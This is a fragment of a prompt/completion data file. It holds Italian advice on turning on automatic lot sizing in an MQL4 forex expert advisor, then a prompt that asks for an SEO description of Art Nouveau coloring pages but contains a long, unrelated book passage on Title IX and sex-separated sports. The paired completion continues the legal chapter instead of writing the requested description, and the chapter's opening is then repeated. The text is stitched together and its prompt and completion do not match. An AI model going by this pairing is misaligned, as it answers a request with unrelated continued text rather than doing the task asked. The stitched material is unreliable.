Seguendo il codice, sembra che questo processo sia già stato parzialmente implementato, ma possa essere stato disattivato o non completato. Ecco cosa puoi fare: 1. Assicurarsi che l'input \\"Autolot\\" sia impostato su \\"true\\" affinché l'EA utilizzi la funzione di autolot. Modifica la seguente linea: \`\`\`mql4 input bool Autolot=false; \`\`\` in: \`\`\`mql4 input bool Autolot=true; // Attiva l'autolot \`\`\` 2. Nella funzione \`AutoLot()\` c'è già un algoritmo di calcolo dell'autolot in base al saldo del conto. Tuttavia, è essenziale verificare che tale funzione venga effettivamente chiamata quando un nuovo ordine viene inviato. Verifica la funzione \`OnTick()\` per assicurarti che venga chiamato \`AutoLot()\` invece di \`FixLot\` ogni volta che viene inviato un nuovo ordine. Cerca le linee come questa per gli ordini \\"buy\\": \`\`\`mql4 ord_send=OrderSend(simbol,0,AutoLot(),MarketInfo(simbol,MODE_ASK),slippage*pip,SLB,TPB,comment,MagicNumber_Buy,0,Blue); \`\`\` e questo per gli ordini \\"sell\\": \`\`\`mql4 ord_send= OrderSend(simbol,1,AutoLot(),MarketInfo(simbol,MODE_BID),slippage*pip,SLS,TPS,comment,MagicNumber_Sell,0,Red); \`\`\` Assicurati che queste chiamate utilizzino la funzione \`AutoLot()\`. 3. Controllare che la gestione delle dimensioni del lotto e i relativi vincoli di dimensione minima e massima siano gestiti correttamente. Questo è particolarmente critico per evitare ordini respinti da broker che impongono limitazioni sulla dimensione del lotto. 4. Verifica tutti i punti del codice in cui si effettuano operazioni di trading per assicurarsi che l'autolot sia utilizzato in tutti i casi e non solo in alcune parti del codice. 5. Una volta che l'autolot è attivato e correttamente implementato, esegui test approfonditi sull'EA in un ambiente di test per assicurarti che funzioni come previsto prima di usarlo in un ambiente di trading dal vivo. Infine, assicurati che il calcolo dell'autolot sia appropriato per la tua strategia di trading e il rischio che sei disposto a prendere. Il codice di calcolo dell'autolot deve essere adeguatamente progettato per adattarsi al profilo di rischio."},{"prompt":"hai tutto il codice, dimmi le modifiche da fare","completion":"Per abilitare l'autolot nel codice MT4 dato, devi accertarti che la variabile \`Autolot\` venga impostata su \`true\` e che la funzione \`AutoLot()\` venga chiamata quando viene inviato un ordine. Facciamo le seguenti modifiche: 1. Cambia il valore di default di \`Autolot\` a \`true\`: \`\`\`mql4 input bool Autolot=true; // Imposta il valore di default su true per abilitare l'autolot \`\`\` 2. Nella funzione \`OnTick()\`, cerca il codice che invia gli ordini e assicurati che \`AutoLot()\` venga chiamato invece di \`FixLot\`. Dovresti trovare due parti del codice, una per le operazioni di acquisto e una per le operazioni di vendita. Ecco come dovrebbe apparire ciascuna: Per gli ordini \\"buy\\" (acquisto): \`\`\`mql4 ord_send=OrderSend(simbol,0,AutoLot(),MarketInfo(simbol,MODE_ASK),slippage*pip,SLB,TPB,comment,MagicNumber_Buy,0,Blue); \`\`\` Per gli ordini \\"sell\\" (vendita): \`\`\`mql4 ord_send= OrderSend(simbol,1,AutoLot(),MarketInfo(simbol,MODE_BID),slippage*pip,SLS,TPS,comment,MagicNumber_Sell,0,Red); \`\`\` Verifica che in nessuna parte del codice \`FixLot\` sia passato come parametro in \`OrderSend()\`. 3. Controlla anche le parti del codice che gestiscono operazioni di martingale o incremento della dimensione del lotto, verificando che usino la funzione \`Lot_Multi1()\` o \`Lot_Multi2()\` se è logico che venga applicato l'autolot. Queste funzioni sembrano gestire il calcolo della dimensione del lotto per le operazioni successive in una serie di martingale. Per esempio: \`\`\`mql4 ord_send=OrderSend(simbol,OP_BUY,Lot_Multi1(),MarketInfo(simbol,MODE_ASK),slippage*pip,SLB_PRICE,0,comment,MagicNumber_Buy,0,Aqua); ord_send=OrderSend(simbol,OP_SELL,Lot_Multi2(),MarketInfo(simbol,MODE_BID),slippage*pip,SLS_PRICE,0,comment,MagicNumber_Sell,0,Magenta); \`\`\` Assicurati che le funzioni \`Lot_Multi1()\` e \`Lot_Multi2()\` restituiscano la dimensione del lotto desiderata in base alla tua strategia di autolot. 4. Verifica che il valore di \`AutoMM\` (che rappresenta il rischio percentuale per trade relativo al saldo del conto) sia impostato correttamente secondo la tua strategia di gestione del denaro. Se \`AutoMM\` è troppo alto, potresti rischiare troppo per ogni trade. Se hai altre funzionalità nell'EA che non sono state coperte in questo esempio (come la verifica del margine libero o la gestione degli errori), dovrai anche assicurarti che esse funzionino correttamente con la gestione dell'autolot abilitata. Infine, prima di lanciare l'EA in un ambiente live, fai un test approfondito su un account demo per assicurarti che l'autolot operi correttamente e in sicurezza secondo le tue aspettative."},{"prompt":"Generate a description with keywords and SEOs for Art Nouveau Inspired Printable Coloring Pages | Creative Fun for Kids | Educational Art Activity | Digital Download.

The dominant principle in modern antidiscrimination law is that all persons should be treated as individuals, without reference to their status as members of a social group. In American law, this translates into a principle of color blindness when we’re speaking about racial equality and gender blindness when the focus is on discrimination against women. Civil rights laws on workplace equality, for example, require employers to use gender-neutral hiring criteria, with few exceptions. Once Title VII of the Civil Rights Act of 1964 went into effect, employers could no longer advertise positions for “women’s jobs” or “men’s jobs.” Instead, the law requires employers to consider men and women together for the same positions—unless the job fits into a narrow category of exceptions where sex is a “bona fide occupational qualification” for performing the job. Men have an equal right to be considered for secretarial positions, just as women can compete for jobs in law enforcement. Whether or not such gender-blind criteria actually produce a diverse mix of men and women throughout the workforce is not the law’s primary concern. Title VII is a quintessentially liberal feminist law, promising a gender-neutral process, not equal results. Title IX’s approach is markedly different from this baseline. As any college or high school sports fan knows, gender blindness is not the rule in competitive sports. Men and women generally do not compete against each other for the same sports opportunities. Title IX left the sex-separate structure of sports largely intact and opted for more substantive measures of equal opportunity rather than a rule of gender blindness. Where Title IX has had the greatest impact, in high school and college varsity sports participation, separation by sex is the rule rather than the exception. Title IX’s allowance for sex separation has facilitated a legal approach that emphasizes results over process and actual opportunities for girls and women over a more formal gender neutrality. However, the law also leaves intact a structure in which women’s sports are too often marginalized as secondary to men’s games, a poor stepsister to the “real” varsity programs.The question of how to structure sport so that it fully includes and values women raises what is known among feminist legal scholars as the dilemma of difference. If women as a group are not similarly situated to men with respect to sports as they are currently played, how can sex-discrimination law best secure equality? Should it ignore gender differences, promote a gender-blind structure, and call it equality if schools have open tryouts for each sport? In this model, the best athlete, male or female, would make the team with no special dispensation for an athlete’s sex. Alternatively, should Title IX take a gender-conscious approach that acknowledges gender difference and makes sure that women have enough opportunities to play sports compared to the number of men’s opportunities? The Dilemma: Separation or Integration? Neither model is costless. Shifting to a framework that offers coed opportunities for all athletes with no attention to gender could potentially wipe out the biggest gains Title IX has produced: the burgeoning numbers of girls and women who participate in competitive school sports. With genderblind team selection and competition, the majority of female athletes could well be relegated to second-tier teams or club and intramural games with only token representation at the varsity level. For many girls and women, such a shift would offer fewer paths to the success and status that so many female athletes have achieved under Title IX. Sport as a path to empowerment would become much narrower for most women, if not closed off completely. Although some individual female athletes might be better off with coed teams because of their ability to excel in competition with male athletes, women as a group would likely face diminished opportunities to play sports at the most elite levels. On the other hand, accommodating gender difference has its costs, too. It reinforces an ideology that has historically been used to justify the outright denial of sports opportunities to women and, more recently, to place a lower value on women’s sports. Having separate men’s and women’s teams risks sending the message that women are inherently lesser athletes. The existence of sex-segregated programs risks identifying female athletes as the second-class citizens of sport. It also sacrifices whatever benefits might be gained by having men and women, and boys and girls, compete with and against one another and the potential transformation in gender relations that might result. As the feminist sport historian Jennifer Hargreaves explains the dilemma, separatism can increase women’s control over sport, mobilize women to fight for equal resources, and enable them to participate in sports free from male domination, but it also re-creates social gender divisions and can exaggerate sexism, with the message that biological sex, rather than culture, defines athleticism.1 This is the classic dilemma of difference, leaving advocates for gender equality damned if they ignore gender and damned if they don’t. Title IX negotiates this terrain with a flexible and pragmatic approach. As a starting point, Title IX allows schools to offer separate competitive teams for men and women. But this baseline can be altered in narrow circumstances recognized by Title IX and, in some cases, the U.S. Constitution’s equal protection clause. The result is that individual athletes have a right to try out for an oppositesex team, but only if they meet certain criteria—criteria that strongly favor tryout rights for women over those for men. In this legal regime, gender separation is the norm, integration the exception. This chapter explores how Title IX navigates the tricky terrain of gender separation and assimilation in sports. It concludes that, although critiques of sex segregation in sport deserve our attention, Title IX has done a relatively good job of forging a pragmatic approach to structuring sports opportunities for girls and women. In forsaking gender blindness for a more gender-conscious, result-oriented model, Title IX has chosen substantive equality over formal equality. This choice has created the potential for expanding girls’ and women’s sports participation and inciting broad-based cultural transformation in society’s response to female athletes and to women’s roles more generally. The Development of Title IX’s Approach to Sex Equality in Sports Title IX emerged from a broader social movement seeking the recognition and vindication of women’s rights. After Congress passed Title VII of the Civil Rights Act of 1964, which banned workplace discrimination on the basis of race, color, religion, sex, or national origin, women’s rights advocates turned their attention to widespread practices of discrimination against girls and women in education. Early drafts of what would become Title IX proposed simply adding “sex” to Title VI of the 1964 Civil Rights Act, which bans race discrimination in all federally funded programs, including education programs. However, in response to extensive testimony in Congress specifically focused on sex discrimination in education, the proposal was redrafted and ultimately enacted as separate legislation. Congressional hearings on the bill barely mentioned sports, focusing instead on the discrimination women faced in gaining admission to collegeand graduate school. At the time, many universities, if they allowed women in graduate programs at all, had quotas limiting the number of places they could fill. The theory was that women were likely to marry and stay home to raise children and should not take slots away from men, who would make better use of their degree.2 To the extent that the topic of sports came up at all in these hearings, it was raised by proponents of Title IX to allay fears that the law would go too far in radically altering male turf. Senator Birch Bayh of Indiana, a leading sponsor of the legislation, mentioned sports only twice during the hearings. The first time was to provide reassurance that the law would not mandate coed football. Senator Peter Dominick of Colorado retorted that he would have had much more fun playing football if it had been coed, prompting chuckles from the Senate gallery. The only other time the subject was mentioned was to reassure members of Congress that Title IX would not require coed locker rooms and would allow personal privacy to be preserved.3 Whatever ambivalence surrounding the law’s coverage of sports was present at the time was overshadowed by a general consensus on the need to expand women’s access to educational opportunities. The final version of the law was enacted as part of an education funding law in 1972—the same year that Congress endorsed the Equal Rights Amendment, which would later die a protracted death in the state ratification process.4 The core provision of Title IX is a broad and general ban on sex discrimination. The heart of the law says simply: “No person in the United States shall, on the basis of sex, be excluded from participation in, be denied the benefits of, or be subjected to discrimination under any education program or activity receiving federal financial assistance. . . .”5 As with other similarly broad statutes, “discrimination” is a loaded and highly malleable term. It requires interpretation, and the consensus that the term generates masks what are often sharp conflicts about its meaning. Today, almost everyone agrees that discrimination is wrong, but questions about what that means, the implications of remedying it, and who will bear the costs have historically been the subject of deep social conflict. Title IX is no exception. The rosy glow of consensus quickly gave way to bitter disputes over the law’s application to sports. Although Senator Bayh’s oblique remarks about football were intended to reassure skeptics that the law would not be too far-reaching, they implicitly reflected an expectation that the law would apply to athletics. The sports establishment soon rallied to try to cabin the law’s implications for intercollegiate sports. The National Collegiate Athletic Association (NCAA) was a leader in this effort. With the group’s support, Senator John Tower of Texas attempted to amend Title IX in the early 1970s. Senator Tower first introduced a bill that would have exempted intercollegiate sports entirely. When that effort ran into opposition, he sponsored an alternative proposal to exempt “intercollegiate athletic activity to the extent that such activity does or may provide gross receipts or donations to the institution necessary to support that activity.”6 The Tower Amendment passed in the Senate, but when the Education Amendments of 1974 reached the joint House-Senate conference, the conference committee replaced it with a compromise provision that basically evaded the tough questions about how Title IX would apply to sports. Proposed by Senator Jacob Javits of New York and henceforth known as the Javits Amendment, the compromise delegated authority to the federal enforcing agency, then the Department of Health, Education, and Welfare (HEW), to issue regulations for implementing Title IX that included “with respect to intercollegiate athletics reasonable provisions considering the nature of particular sports.”7 The Javits Amendment recognized that Title IX should allow for differences among individual sports, with football and its mega-budgets and squad sizes being the elephant in the room, but it implicitly rejected the notion that a sport’s ability to raise revenue should categorically exempt it from Title IX. Still, the compromise left the details—large and small—to be worked out at another level of government. During the second half of the 1970s, the battle over Title IX shifted from Congress to federal regulators and eventually to the courts. Even before the Javits Amendment turned over the job to HEW, the agency’s Office for Civil Rights had already begun struggling with the difficult question of how to craft antidiscrimination standards to fit intercollegiate athletics. Lawyers at HEW quickly realized that the desegregation model for enforcing Title VI, which covers race discrimination in federally funded schools, could not simply be replicated in Title IX.8 They recognized that competitive sport was a particularly thorny area for developing measures of gender equality. In the vast majority of settings in which antidiscrimination laws apply, including employment and voting rights, assimilation and gender neutrality are the guiding norms and goals shared by the law’s supporters.9 For example, although American workplaces continue to have a significant degree of de facto sex gender segregation, both vertically and horizontally, employment discrimination laws aspire to dismantle this segregation and create a genderblind opportunity structure.10 In the world of sports, however, it is much less clear that integration is or should be the primary goal of Title IX. As was true in 1972, sex segregation remains the norm for sports competition today, and there is no consensus, even among Title IX’s strongest proponents, that the law should aspire otherwise. When HEW was developing its proposal for Title IX regulations, some stakeholders argued for sex integration as the measure of equality. Among them, some women’s rights advocates acknowledged that temporarily separate sports programs for women might be necessary as a type of affirmative action but pushed for the ultimate goal of having men and women compete for a spot on the same team. Other stakeholders who supported sex integration, however, did so as a way of preserving the status quo. For example, during early debates over the Title IX regulations, some male athletic directors argued that colleges should be able to satisfy Title IX simply by opening tryouts to men and women, even if the end result was all-male teams with no additional female participation.11 Supporters of separate women’s sports programs vigorously resisted such proposals, arguing for a more substantive measure of nondiscrimination that would ensure meaningful opportunities to participate. The debate drove a wedge between women’s rights advocates over how best to achieve sex equality in sports. The feminist group most critical of sex segregation in sports, the National Organization for Women (NOW), argued that “separate but equal” was an inappropriate permanent baseline for sports, as for other areas of public life. But NOW acknowledged that sex-separate teams might be a necessary interim measure until the gap in training and experience closed and women could meaningfully compete with men. Other advocates of women’s sports were more comfortable with sex separation as a lasting baseline and pushed for measures of equality within sexseparate programs. The Association for Intercollegiate Athletics for Women (AIAW), for example, argued for separate teams for all men’s and women’s sports, with proportionate funding.12 The organization made the case that giving women control over their own resources would allow them to develop their own model of sports rather than simply replicate what men had designed for themselves. Separation would allow women broader opportunities in sport instead of limiting them to the sports selected for men. More important, the group hoped that women’s programs might avoid the commercialism that was already taking hold in men’s programs, and emphasized broad participation, instead of spending vast sums on a few elite athletes.13 The AIAW represented female physical educators, the vast majority of whom would have been pleased with separate teams, as long as they had sufficient resources to succeed. Sifting through the arguments in 1973, HEW’s Office for Civil Rights initially considered two very different approaches: (1) opening up team tryouts to all athletes, male and female; or (2) keeping sex-separate programs but developing measures of equality to ensure equal opportunities.14 By 1974, when it issued draft regulations, HEW had rejected the first option. Instead, the draft regulations issued for public “notice and comment” required educational institutions to annually gauge the athletic interests of their student bodies and to engage in affirmative action to increase women’s opportunities in sports.15 The “affirmative efforts” requirement included providing women with training and support and encouraging them to take advantage of existing athletic opportunities. The agency received nearly ten thousand sets of written comments on the draft regulations, prompting Secretary Casper Weinberger to observe, with a tinge of sarcasm, that “the most important issue in the United States today is intercollegiate athletics.”16 Various interest groups opposed the draft regulations, including the NCAA, which feared the regulations would have the effect of taking resources away from men’s sports. After sorting through the comments, HEW made substantial revisions before issuing final regulations in 1975. The Javits Amendment had given Congress a window of opportunity to block the regulations if it disapproved of them. Backed by the NCAA and the big-time football schools, members of Congress introduced several resolutions to stop the regulations from taking effect. Supporters fought back in congressional hearings on the regulations, putting forward extensive evidence on the extent and magnitude of sex discrimination in intercollegiate athletics. Among the many examples, Ohio State University was noted for spending 1,300 times more money on male than on female athletes.17 The effort to disapprove the regulations ultimately failed, and they went into effect in the summer of 1975.18 They allowed for a three-year grace period for athletic programs, requiring full compliance by 1978. The deadline passed with very little effort toward compliance, but there was much continuing dialogue about exactly what the regulations required. Title IX’s Baseline: Separation, Not Integration The final Title IX regulations reflect the determination that gender neutrality in team tryouts is insufficient to provide real equality for women in sport. And yet, the structure of the regulation on equal athletic opportunity is itself interesting, and reflects some ambivalence about sex segregation in sports even as it rejects assimilation as the full measure of equality. The key regulation begins with a strong statement endorsing gender integration in sports. The first section states: (a) General. No persons shall, on the basis of sex, be excluded from participation in, be denied the benefits of, be treated differently from another person or otherwise be discriminated against in any interscholastic, intercollegiate, club or intramural athletics offered by a recipient, and no recipient shall provide any such athletics separately on such basis. 19 After this strong statement endorsing sex integration in sports programs, the next part of the regulation reads like a jarring reversal: (b) Separate Teams. Notwithstanding the requirements of paragraph (a) of this section, a recipient may operate or sponsor separate teams for members of each sex where selection for such teams is based upon competitive skill or the activity involved is a contact sport.20 Although the structure of the regulation suggests that integration is the general rule, with sex separation being the exception, in reality the reverse is true. At least at the varsity level, team selection is always based on competitive skill, which means that sex-separate teams are allowed in both contact and noncontact sports. If sex separation is the exception, then it is the exception that swallows the rule. By using the term “may” rather than “shall,” the Title IX regulation itself does not require separate athletic offerings for men and women. However, by permitting sex-separate programs under most circumstances, the Title IX regulations left intact the reality of sex-segregated sports. Moreover, it is not at all clear that a gender-blind team selection process would satisfy the regulation’s commitment to equal athletic opportunity. A separate requirement in a later provision of the regulation, discussed in depth in chapter 3, requires equal athletic opportunity in the selection of sports and levels of competition so as to effectively accommodate the interests and abilities of members of both sexes.21 In its comments on this part of the regulations, HEW explained that this provision may effectively require schools to provide separate teams for male and female athletes. In order to accommodate the interests and abilities of women, the agency advised, “an institution would be required to provide separate teams for men and women in situations where the provision of only one team would not ‘accommodate the interests and abilities of both sexes.’”22 Whether merely permitted or actually required by Title IX, sex-separate teams for women have remained the norm in the post–Title IX era. This reality fundamentally shapes the rest of Title IX’s approach to equal athletic opportunity. Within the baseline of separation, there is some allowance in the Title IX regulations for integration rights, a topic taken up in the next chapter, but coed sports are the exception and not the rule. This has generated a longstanding debate about whether sex-separate teams can ever be truly equal and whether separation is the best baseline under Title IX. A (Locker) Room of One’s Own: The Case for Separation The case for having a baseline of separate sports for men and women dates back to the pre–Title IX years, when women athletic administrators were in the early stages of developing women’s sports. In 1963, female athletic administrators attending the NCAA annual convention asked the NCAA not to allow women to compete on men’s teams.23 They had several rationales, including a fear that women would be hurt in competition with men, a concern about a potential talent drain from women’s sports, and a desire to prevent women’s programs from developing along the same lines as men’s sports, with their scandals and commercialism. In addition, the push for maintaining separate women’s programs was based on a desire to maintain control over women’s sports by female educators, who placed a different, more educational value on sports than the administrators who ran men’s sports. Early judicial rationales for sex separation in sports emphasized physical differences and the potential for women to be injured in coed competition. However, as such rationales came to be viewed as chauvinistic and inconsistent with emerging legal norms on gender discrimination, the dominant rationale shifted to an emphasis on protecting women’s increasing athletic opportunities from male encroachment. An important test case arose in 1980. It involved a talented eleven-year-old girl, Karen O’Connor, who wanted to try out for the sixth-grade boys’ basketball team. Karen had played basketball with boys in youth sports leagues since she was seven years old. Although the junior high school she attended offered both girls’ and boys’ basketball teams, Karen believed that only the boys’ team could offer her the level of competition that would enable her to develop her skills. When school officials insisted that she try out for the girls’ team or not compete at all, as required by the school’s athletic conference, Karen’s parents sued on her behalf, bringing claims under both Title IX and the equal protection clause.24 Karen’s ability to compete with boys on the basketball court was not the issue. As the court of appeals acknowledged, “a professional basketball coach who observed her play rated her ability as equal to or better than a female high school sophomore and equal to that of a male eighth-grade player.”25 Nevertheless, the appellate court reversed the lower court’s ruling that she had a right to try out for the boys’ team. Emphasizing that the teams were equal except for the level of play by the athletes themselves, the court ruled that the school district’s decision to maintain separate girls and boys teams was justified by the important objective of increasing girls’ overall participation in sports.26 U.S. Supreme Court Justice John Paul Stevens, who sided with the school district in an earlier proceeding in the case, made a similar point:27 In my opinion, the question whether the discrimination is justified cannot depend entirely on whether the girls’ program will offer Karen the opportunities that are equal in all respects to the advantages she would gain from the higher level of competition in the boys’ program. The answer must depend on whether it is permissible for the defendants to structure their athletic programs by using sex as one criterion for eligibility. If the classification is reasonable in substantially all of its applications, I do not believe that the general rule can be said to be unconstitutional simply because it appears arbitrary in an individual case.28 Justice Stevens’s remarks reflect the tension between a model of equality that prioritizes the goal of advancing the position of a social group and one geared toward ensuring that individuals are not penalized by their social group membership. His position, and that of the appellate court, prioritizes the rights of the social group, women, to maximize their overall athletic opportunities. Under this reasoning, if team selection were made on a gender-blind, individualized basis, male athletes would likely dominate sports teams, leaving fewer opportunities for women. Even if men could somehow be kept off of women’s teams, there would still be a significant cost to women’s sports. The talent drain from having the best female athletes play on “men’s” teams could slow the development of women’s sports, depriving other women of the chance to compete against the best women in the game. Interest in women’s sports might develop more slowly as a result, with women’s teams being further stigmatized for including only those women not good enough to get onto the “men’s” team. The more recent controversy over the teen golf phenomenon Michelle Wie and her effort to play in the men’s league shows that the same set of concerns still arises when elite women athletes seek to leave the women’s game to compete with men. When Wie took the game by storm as a fifteen-yearold, generating the kind of public attention and media spotlight rarely seen in women’s golf, many supporters of the Ladies Professional Golf Association (LPGA) feared that her determination to play in the Professional Golfers’ Association (PGA) would hurt the women’s league. As one sports writer described the predicament, “No wonder the LPGA is nervous about Wie. It cannot afford to lose golf ’s starlet to a man’s world.”29 Wie’s foray into the men’s game generated a great deal of press attention, but her fame quickly faded when she did not excel in that venue. Some perceived it as a slight to the LPGA, in which Wie had yet to distinguish herself as a champion comparable to the likes of Annika Sorenstam. One commentator lamented, “Michelle Wie would generate more attention for playing poorly at men’s events than Sorenstam did for winning against women. Which, of course, is a shame.”30 By choosing to compete against men, elite female athletes may send the message that competition with men is more worthy of public attention and accolades than women’s sports. The O’Connor case typifies the rationales courts use to justify sex segregation in sports. The Sixth Circuit Court of Appeals used similar reasoning in another watershed case that addressed the constitutionality of sex separation in sports, this time overturning a lower-court ruling that Title IX’s allowance for separate teams in contact sports violated the equal protection clause of the U.S. Constitution. The Sixth Circuit ruled that a school district has the discretion to offer coed opportunities where doing so furthers equal opportunity for girls, as for example where there is no comparable girls’ team in the sport. However, the court rejected the argument that Title IX’s allowance of sex-separate opportunities violates the equal protection clause. The court took a more substantive approach to equality, explaining, “[w]hen males and females are not in fact similarly situated and when the law is blind to those differences, there may be as much a denial of equality as when a difference is created which does not exist.”31 The court continued, expressing its concern for promoting real opportunities for girls: When considering the constitutionality of Title IX and its regulations, a blanket requirement of one team at each age level might result in male dominance of all teams and cause a return to pre-Title IX conditions, a result completely at variance with the statute’s purpose. It is desirable to maximize the opportunities for individual women, but a requirement that boys play only on boys’ teams while girls may compete either with the boys or in an all-girls’ program (as they wish) might have a similar undesirable effect on the fledgling women’s athletic programs; women’s athletics may be significantly harmed if the best female competition is lost to the boys’ program.32 Like Justice Stevens in his opinion in the O’Connor case, this court viewed Title IX as protecting the rights of women as a group over the occasionally conflicting interests of exceptional female athletes.33 There is, of course, a significant cost to this model of equality that emphasizes what is best for women as a group. Exceptionally gifted athletes like Karen O’Connor who are able to compete with male athletes may be worse off because they are denied the chance to play at the highest level. Karen O’Connor felt so strongly about her preference for competing with boys that, after losing in court, she chose not to try out for the girls’ team and to forgo playing basketball at the school.34 Limiting exceptional female athletes to competition on women’s teams may keep the very best female athletes from developing to their full potential, depriving the public of seeing just how good top female athletes can become. Faced with this tension, Title IX sides with a group-based vision of equality, emphasizing the goal of developing strong women’s sports programs that expand women’s overall opportunities. As Justice Stevens explained, “without a gender-based classification . . . there would be a substantial risk that boys would dominate the girls’ program and deny them an equal opportunity to compete in interscholastic events.”35 Such an approach would leave many girls and women shut out of varsity sports entirely, relegated to second-tier sports competition. In such a world, there would be too few female athletes competing to shift cultural gender norms. The few women competing at high levels would be perceived as tokens and as exceptional female athletes who are recognized because of their differences from other women, thereby ultimately reinforcing the norm of female athletic inferiority rather than contesting it. As Michael Messner, a scholar of sport and sociology, has warned, mixed-sex competition under the guise of “equal opportunity” and liberal feminism “is likely to become a new means of solidifying the ideological hegemony of male superiority” by “provid[ing] support for the ideology of meritocracy while at the same time offering incontrovertible evidence of the ‘natural’ differences between males and females.”36 In other words, a shift from sex separation to a gender-blind selection process would send the message that men have “earned” their privileged status in sports, while reinforcing the notion that few women belong in sport, and only if they can compete on men’s terms. Indeed, in the battle over the meaning of equal opportunity in sports, the gender-blind approach has often been a strategy for thwarting more substantive measures of equality. When a class of female athletes sued Temple University in the 1980s for not allocating enough funding, resources, or opportunities for women to play varsity sports, Temple responded that its varsity men’s teams just happened to be filled by men. In actuality, Temple claimed, the teams are open to any athlete good enough to make them, male or female. As a result, Temple argued, the funding, resources, and opportunities provided to athletes on teams filled by men should count as programs that support female athletes, as well. This argument did not prevail, and the female athletes who brought the case eventually won an important settlement requiring Temple to put more resources into its women’s sports program. More recently, Florida’s state high school athletic association used a similar argument in attempting to defend a 20 percent schedule reduction for varsity sports that exempted football. Classifying football as a coed sport since girls as well as boys could try out, the association argued that the schedule cuts were gender-neutral. It later backed down from this argument when parents of female athletes filed a Title IX lawsuit, alleging that the exemption of football left girls bearing the brunt of the cuts. The case was settled when the association agreed to rescind the schedule changes.37 In addition to protecting large numbers of competitive sports opportunities for women, the case for sex separation also considers how best to structure sport to make it an empowering experience for girls and women. Many girls and women prefer having their own teams, where they are less likely to feel threatened, inadequate, or unwelcome.38 Research on coed sports suggests that male athletes tend to take over, keeping women from playing or fully developing their skills and confidence.39 The sports anthropologist Faye Linda Wachs explains that “when girls attempt to join boys in sports, they often find themselves ignored, placed in devalued positions (positions to which the ball is rarely hit), and they do not receive the same instruction and encouragement as the boys.”40 Her study of adult coed softball found that male athletes used a number of strategies for limiting women’s participation, including “positional segregation,” that is, the “gendering” of field positions and the placement of players into positions by gender. Through this tactic, women were more likely to be placed in “helper” positions where they would pass the ball to others, rather than make the play themselves. Another strategy identified in the study was “the switch,” in which male players temporarily switched positions with female players in order to make a play. For example, a male outfielder would run into a female player’s territory and shout, “I got it,” even if the female player was well positioned to catch the ball. Wachs explains how these kinds of practices become a self-fulfilling prophecy. Anticipating the “switch,” a female athlete will play more tentatively, unsure of whether to step in and make the play or leave it to a male colleague. If she","completion":"tries to make the play and fails, she is likely to be blamed for the mistake, and if she steps back, she is criticized for not being aggressive enough. These forms of exclusion and marginalization can have a significant impact on female athletes, eroding their confidence and sense of belonging in sports.41 Overall, the case for maintaining sex separation in sports rests on several foundations: protecting and expanding women’s overall opportunities in sports, ensuring that women’s sports are not stigmatized or disadvantaged by becoming a stepping-stone to men’s sports, and creating an environment in which girls and women can develop their physical skills with confidence and autonomy. Advocates of separating out girls’ and women’s sports have a powerful vision of what good can come from this model, and have worked tirelessly to make this vision a reality. The question that remains is whether Title IX’s endorsement of sex separation will fulfill the potential it has to advance women in sports, or whether it will reinforce old patterns of exclusion and marginalization in new ways.

The dominant principle in modern antidiscrimination law is that all persons should be treated as individuals, without reference to their status as members of a social group. In American law, this translates into a principle of color blindness when we’re speaking about racial equality and gender blindness when the focus is on discrimination against women. Civil rights laws on workplace equality, for example, require employers to use gender-neutral hiring criteria, with few exceptions. Once Title VII of the Civil Rights Act of 1964 went into effect, employers could no longer advertise positions for “women’s jobs” or “men’s jobs.” Instead, the law requires employers to consider men and women together for the same positions—unless the job fits into a narrow category of exceptions where sex is a “bona fide occupational qualification” for performing the job. Men have an equal right to be considered for secretarial positions, just as women can compete for jobs in law enforcement. Whether or not such gender-blind criteria actually produce a diverse mix of men and women throughout the workforce is not the law’s primary concern. Title VII is a quintessentially liberal feminist law, promising a gender-neutral process, not equal results. Title IX’s approach is markedly different from this baseline. As any college or high school sports fan knows, gender blindness is not the rule in competitive sports. Men and women generally do not compete against each other for the same sports opportunities. Title IX left the sex-separate structure of sports largely intact and opted for more substantive measures of equal opportunity rather than a rule of gender blindness. Where Title IX has had the greatest impact, in high school and college varsity sports participation, separation by sex is the rule rather than the exception. Title IX’s allowance for sex separation has facilitated a legal approach that emphasizes results over process and actual opportunities for girls and women over a more formal gender neutrality. However, the law also leaves intact a structure in which women’s sports are too often marginalized as secondary to men’s games, a poor stepsister to the “real” varsity programs.The question of how to structure sport so that it fully includes and values women raises what is known among feminist legal scholars as the dilemma of difference. If women as a group are not similarly situated to men with respect to sports as they are currently played, how can sex-discrimination law best secure equality? Should it ignore gender differences, promote a gender-blind structure, and call it equality if schools have open tryouts for each sport? In this model, the best athlete, male or female, would make the team with no special dispensation for an athlete’s sex. Alternatively, should Title IX take a gender-conscious approach that acknowledges gender difference and makes sure that women have enough opportunities to play sports compared to the number of men’s opportunities? The Dilemma: Separation or Integration? Neither model is costless. Shifting to a framework that offers coed opportunities for all athletes with no attention to gender could potentially wipe out the biggest gains Title IX has produced: the burgeoning numbers of girls and women who participate in competitive school sports. With genderblind team selection and competition, the majority of female athletes could well be relegated to second-tier teams or club and intramural games with only token representation at the varsity level. For many girls and women, such a shift would offer fewer paths to the success and status that so many female athletes have achieved under Title IX. Sport as a path to empowerment would become much narrower for most women, if not closed off completely. Although some individual female athletes might be better off with coed teams because of their ability to excel in competition with male athletes, women as a group would likely face diminished opportunities to play sports at the most elite levels. On the other hand, accommodating gender difference has its costs, too. It reinforces an ideology that has historically been used to justify the outright denial of sports opportunities to women and, more recently, to place a lower value on women’s sports. Having separate men’s and women’s teams risks sending the message that women are inherently lesser athletes. The existence of sex-segregated programs risks identifying female athletes as the second-class citizens of sport. It also sacrifices whatever benefits might be gained by having men and women, and boys and girls, compete with and against one another and the potential transformation in gender relations that might result. As the feminist sport historian Jennifer Hargreaves explains the dilemma, separatism can increase women’s control over sport, mobilize women to fight for equal resources, and enable them to participate in sports free from male domination, but it also re-creates social gender divisions and can exaggerate sexism, with the message that biological sex, rather than culture, defines athleticism.1 This is the classic dilemma of difference, leaving advocates for gender equality damned if they ignore gender and damned if they don’t. Title IX negotiates this terrain with a flexible and pragmatic approach. As a starting point, Title IX allows schools to offer separate competitive teams for men and women. But this baseline can be altered in narrow circumstances recognized by Title IX and, in some cases, the U.S. Constitution’s equal protection clause. The result is that individual athletes have a right to try out for an oppositesex team, but only if they meet certain criteria—criteria that strongly favor tryout rights for women over those for men. In this legal regime, gender separation is the norm, integration the exception. This chapter explores how Title IX navigates the tricky terrain of gender separation and assimilation in sports. It concludes that, although critiques of sex segregation in sport deserve our attention, Title IX has done a relatively good job of forging a pragmatic approach to structuring sports opportunities for girls and women. In forsaking gender blindness for a more gender-conscious, result-oriented model, Title IX has chosen substantive equality over formal equality. This choice has created the potential for expanding girls’ and women’s sports participation and inciting broad-based cultural transformation 